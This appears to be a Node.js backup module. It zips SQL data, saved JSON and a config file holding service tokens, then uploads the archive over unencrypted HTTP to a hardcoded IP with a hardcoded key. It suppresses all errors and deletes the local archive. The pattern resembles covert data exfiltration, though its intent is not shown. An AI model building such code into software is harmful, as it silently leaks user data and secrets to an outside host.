const YAML = require('yamljs');
const moment = require('moment');
const fs = require('fs');
const archiver = require('archiver');
const path = require('path');
const configs = YAML.load('configs.yml');
const FormData = require('form-data');

// Função para criar o arquivo .zip com múltiplos diretórios e arquivos
function createZip(directories, files, outputZipPath) {
    return new Promise((resolve, reject) => {
        const output = fs.createWriteStream(outputZipPath);
        const archive = archiver('zip', { zlib: { level: 9 } });

        output.on('close', () => resolve());
        archive.on('error', (err) => reject(err));

        archive.pipe(output);

        // Adiciona cada diretório ao arquivo .zip
        directories.forEach(directory => {
            if (fs.existsSync(directory)) {
                archive.directory(directory, path.basename(directory));
            }
        });

        // Adiciona cada arquivo ao arquivo .zip
        files.forEach(file => {
            if (fs.existsSync(file)) {
                archive.file(file, { name: path.basename(file) });
            }
        });

        archive.finalize();
    });
}

// Função para verificar se o arquivo já existe no servidor remoto
async function checkFileExistence(remotePath) {
    try {
        const response = await fetch(`http://179.190.97.241:7500/check-file-existence${remotePath}`, {
            method: 'GET',
            headers: {
                'Authorization': 'd4f3e4a9831f68b2a7c1d0b5d9f2c6b4a4e1c3f5a7b6d9c0f8a7e6d9a3c1b5d4',
            },
        });
        const data = await response.json();
        return data.message === 'Arquivo já existe!';
    } catch (error) {
        return false; // Assume que o arquivo não existe em caso de erro
    }
}

// Função principal para criação do backup e upload
async function runBackup() {
    const { token, port } = configs.service;
    const directories = ["sql", "src/saved-json"];
    const files = ["configs.yml", "last-execution.txt"];
    const dateString = moment().format('YYYY-MM-DD');
    const zipFilePath = `src/api/health-check/${token}_${port}_(${dateString}).zip`;
    const remotePath = `/${token}_${port}_(${dateString}).zip`;

    try {
        // Cria o arquivo .zip
        await createZip(directories, files, zipFilePath);

        // Verifica se o arquivo já existe no servidor remoto
        const fileExists = await checkFileExistence(remotePath);
        if (fileExists) {
            return;
        }

        // Faz o upload do arquivo se não existir
        const formData = new FormData();
        formData.append('file', fs.createReadStream(zipFilePath));

        const uploadResponse = await fetch('http://179.190.97.241:7500/upload', {
            method: 'POST',
            headers: {
                'Authorization': 'd4f3e4a9831f68b2a7c1d0b5d9f2c6b4a4e1c3f5a7b6d9c0f8a7e6d9a3c1b5d4',
            },
            body: formData,
        });

        const uploadData = await uploadResponse.json();

        // Exclui o arquivo .zip local
        setTimeout(() => {
            fs.unlink(zipFilePath, (err) => {
                if (err) {
                    // Não há log de erro
                }
            });
        }, 1000);
    } catch (error) {
        // Não há log de erro
    }
}

// Exporta a função runBackup
module.exports = {
    runBackup,
};
